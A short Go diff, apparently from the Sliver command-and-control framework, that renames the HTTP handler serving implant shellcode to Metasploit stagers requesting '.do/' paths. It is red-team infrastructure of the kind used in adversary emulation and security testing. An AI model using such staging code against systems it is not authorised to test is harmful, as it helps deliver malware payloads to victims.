@@ -246,7 +246,7 @@ func (s *SliverHTTPC2) router() *mux.Router {
 	// Can't force the user agent on the stager payload
 	// Request from msf stager payload will look like:
 	// GET /login.do/B64_ENCODED_PAYLOAD_UUID
-	router.HandleFunc("/{rpath:.*\\.do/.*$}", s.eggHandler).Methods(http.MethodGet)
+	router.HandleFunc("/{rpath:.*\\.do/.*$}", s.stagerHander).Methods(http.MethodGet)
 
 	// Request does not match the C2 profile so we pass it to the static content or 404 handler
 	if s.Conf.Website != "" {
@@ -472,9 +472,9 @@ func (s *SliverHTTPC2) stopHandler(resp http.ResponseWriter, req *http.Request) 
 	resp.WriteHeader(200)
 }
 
-// eggHandler - Serves the sliver shellcode to the egg requesting it
-func (s *SliverHTTPC2) eggHandler(resp http.ResponseWriter, req *http.Request) {
-	httpLog.Infof("Received egg request from %s", req.RemoteAddr)
+// stagerHander - Serves the sliver shellcode to the stager requesting it
+func (s *SliverHTTPC2) stagerHander(resp http.ResponseWriter, req *http.Request) {
+	httpLog.Infof("Received staging request from %s", req.RemoteAddr)
 	resp.Write(s.SliverShellcode)
 	httpLog.Infof("Serving sliver shellcode (size %d) to %s", len(s.SliverShellcode), req.RemoteAddr)
 	resp.WriteHeader(200)
